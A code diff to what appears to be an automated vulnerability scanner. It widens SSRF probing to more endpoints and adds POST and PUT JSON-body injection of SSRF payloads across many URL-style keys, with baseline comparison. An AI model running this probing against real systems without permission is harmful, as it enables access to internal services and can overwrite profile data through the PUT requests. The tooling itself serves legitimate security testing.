@@ -28,7 +28,10 @@
 
   SSRF_PATHS = ['/fetch', '/proxy', '/load', '/preview', '/pdf',
                 '/api/fetch', '/api/proxy', '/webhook', '/import', '/ssrf',
-                '/url', '/curl', '/request', '/image', '/avatar']
+                '/url', '/curl', '/request', '/image', '/avatar',
+                '/profile', '/api/profile', '/api/avatar', '/api/image',
+                '/api/screenshot', '/api/thumbnail', '/api/preview',
+                '/share', '/api/share', '/api/callback', '/api/webhook']
 
   # SSRF test payloads — specific content checks (NOT just len > 100)
   SSRF_PAYLOADS = [
@@ -115,6 +118,55 @@
                                     'label': ssrf['label'], 'method': method.upper(),
                                     'evidence': r.text[:500]})
               break
+
+  # ── PART 2: SSRF via JSON API body (REST APIs accepting URL fields) ──────
+  # Many APIs accept JSON like {"url":"..."}, {"imageUrl":"..."}, {"profileUrl":"..."}
+  JSON_URL_KEYS = ['url', 'imageUrl', 'image_url', 'avatar', 'avatarUrl',
+                   'profileImage', 'profile_image', 'photoUrl', 'photo_url',
+                   'link', 'callback', 'webhook', 'source', 'src', 'target',
+                   'redirect', 'fetch', 'load', 'uri', 'endpoint']
+
+  api_endpoints = [p for p in _G.get('ALL_LINKS', set()) if '/api/' in p or '/rest/' in p]
+  api_endpoints += [BASE.rstrip('/') + p for p in ['/api/users', '/api/profile',
+      '/api/settings', '/api/config', '/api/upload', '/api/import', '/api/image',
+      '/profile', '/settings', '/account'] if p not in str(api_endpoints)]
+
+  print(f"\n[SSRF] Testing {len(api_endpoints)} API endpoints for JSON body SSRF")
+  for api_url in list(set(api_endpoints))[:15]:
+      base_api = api_url.split('?')[0]
+      if not base_api.startswith('http'):
+          base_api = urljoin(BASE, base_api)
+      for url_key in JSON_URL_KEYS:
+          for ssrf in SSRF_PAYLOADS[:3]:
+              time.sleep(0.3)
+              try:
+                  r = session.post(base_api, json={url_key: ssrf['payload']},
+                                   timeout=10, headers={'Content-Type': 'application/json'})
+                  if ssrf['check'](r.text):
+                      # Verify it's not in baseline
+                      r_base = session.post(base_api, json={url_key: 'https://example.com/safe'},
+                                            timeout=10, headers={'Content-Type': 'application/json'})
+                      if not ssrf['check'](r_base.text):
+                          print(f"[CRITICAL] SSRF via JSON body: {base_api} key={url_key}")
+                          print(f"  Payload: {ssrf['payload']}  ({ssrf['label']})")
+                          ssrf_findings.append({'url': base_api, 'param': url_key,
+                              'payload': ssrf['payload'], 'label': ssrf['label'],
+                              'method': 'POST (JSON)', 'evidence': r.text[:500]})
+                          break
+                  # Also try PUT (profile updates often use PUT)
+                  r2 = session.put(base_api, json={url_key: ssrf['payload']},
+                                   timeout=10, headers={'Content-Type': 'application/json'})
+                  if ssrf['check'](r2.text):
+                      r_base2 = session.put(base_api, json={url_key: 'https://example.com/safe'},
+                                            timeout=10, headers={'Content-Type': 'application/json'})
+                      if not ssrf['check'](r_base2.text):
+                          print(f"[CRITICAL] SSRF via PUT JSON body: {base_api} key={url_key}")
+                          ssrf_findings.append({'url': base_api, 'param': url_key,
+                              'payload': ssrf['payload'], 'label': ssrf['label'],
+                              'method': 'PUT (JSON)', 'evidence': r2.text[:500]})
+                          break
+              except Exception:
+                  continue
 
   if ssrf_findings:
       _G.setdefault('FINDINGS', [])
